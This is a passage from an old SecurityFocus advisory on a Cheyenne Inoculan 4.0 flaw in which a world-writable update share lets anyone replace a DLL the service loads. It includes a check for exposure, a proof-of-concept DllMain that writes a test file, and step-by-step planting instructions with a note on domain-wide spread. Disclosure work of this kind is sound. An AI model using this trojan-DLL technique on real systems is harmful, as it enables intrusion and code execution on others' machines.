source: http://www.securityfocus.com/bid/106/info

It is possible to run arbitrary code on any Intel machine running Cheyenne Inoculan version 4.0 for Windows NT prior to SP2. 

Inoculan runs as a service, called "Cheyenne InocuLAN Anti-Virus Server". 
When it starts, it replaces any shared directory with the same name and shares "CHEYUPD$" with full control for the everyone group.

When the service starts, it does an update check in this directory (usually "C:\Inoculan\Update\" ) using the files "&lt;NtBox&gt;\CHEYUPD$\English\NtIntel\Ready\filelist.txt" and [idem]...\avh32dll.dll

Simply "touching" or modifying the file "filelist.txt" to look younger than real causes the update. Th update causes the service to stop, the avh32dll.dll DLL to replace the existing one (usually in 
c:\inoculan\avh32dll.dll) and then starts the service again.
When the service starts, it loads the DLL into memory, and THEN does a lot of 
stuff (including checking if it is a valid DLL, I presume).

You can write a DLL that executes arbitrary code at the time it 
is loaded in memory, at the precise time when DllMain is called by the image loader, before any other function have a chance to be called.

To check if you are vulnerable, if you have the resource kit installed, run 

SRVCHECK.EXE \\&lt;YourMachine&gt;

else run srvmgr.exe from a NT server on the same domain, select &lt;YourMachine&gt; and select "Computer|Shared Directories".

If there is a shared directory called "CHEYUPD$" that allows "FULL CONTROL" to the "EVERYONE" group, you are vulnerable.

An interesting point is that Inoculan uses "domains". In one domain, a single server forwards the updates to all machines participating in that "domain" (nothing to do with NT domains). It may be possible to write the trojan DLL to the domain's server CHEYUPD$ shared directory, and have it copy it to all the machines in the domain.

inoctroj.cpp:
-------Cut here -----------
#include "stdio.h"

long __stdcall DllMain (long, unsigned long, void*)
{
// Any code can goes here. This is an exemple
// What it does is simply create a file on C: drive root directory
// and writing "hello world !" inside of it
FILE * demo;

// create a file
demo = fopen ( "C:\\I_can_write_a_file.txt", "w");

// write to the file
char * buf = "hello world ! ";
fwrite ( buf,1, 15, demo);
fclose ( demo );

// This aborts the DLL loading. Anyway, we're done at that time ;))
return 0; 
}

-------Cut here -----------

Compile and link to make the target avh32dll.dll. Write it to 
<NtBox>\CHEYUPD$\English\NtIntel\Ready\, touch 
<NtBox>\CHEYUPD$\English\NtIntel\Ready\filelist.txt to be newer
that it currently is. Wait for the user to stop and restart the InnocuLAN 
server, or for them to reboot.